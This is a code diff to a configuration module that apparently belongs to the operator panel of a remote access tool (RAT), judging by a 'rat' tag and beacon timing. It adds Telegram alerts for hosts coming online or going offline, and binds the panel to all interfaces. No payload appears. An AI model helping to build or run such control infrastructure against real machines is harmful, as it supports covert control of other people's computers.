@@ -46,6 +46,14 @@ DEFAULTS = {
         "password": "",
     },
     "secret": "",
+    "telegram": {
+        "enabled": False,
+        "token": "",           # from @BotFather
+        "chat_id": "",         # your chat id
+        "notify_online": True,
+        "notify_offline": True,
+        "notify_events": False,
+    },
     "beacon_ms": 15000,
     "timeout_ms": 10000,
     "tag": "rat",
@@ -82,6 +90,22 @@ def save(cfg: dict) -> str:
             f.write("\n")
         os.replace(tmp, path)
     return path
+
+
+def bind_address(web: dict) -> str:
+    """
+    The address the panel socket is bound to.
+
+    The configured host is the PUBLIC address: it goes into setting.json and
+    into the URL the operator opens. Binding to it directly fails when the
+    address is not assigned to this machine (a NAT address, a hostname that
+    resolves elsewhere, a test address), so the socket is bound to every
+    interface instead and the public address stays in the config.
+    """
+    host = (web or {}).get("host", "127.0.0.1")
+    if host in ("0.0.0.0", "::", "127.0.0.1", "localhost"):
+        return host
+    return "0.0.0.0"
 
 
 def is_configured() -> bool:
